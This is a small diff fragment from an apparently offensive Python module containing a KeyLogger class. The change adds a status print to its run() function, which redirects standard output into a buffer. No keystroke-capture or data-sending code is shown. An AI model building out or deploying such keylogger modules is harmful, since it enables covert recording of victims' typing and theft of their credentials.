@@ -54,6 +54,7 @@ class KeyLogger:
         return True
 
 def run():
+    print("[*] In keylogger module.")
     save_stdout = sys.stdout
     sys.stdout = StringIO()
 
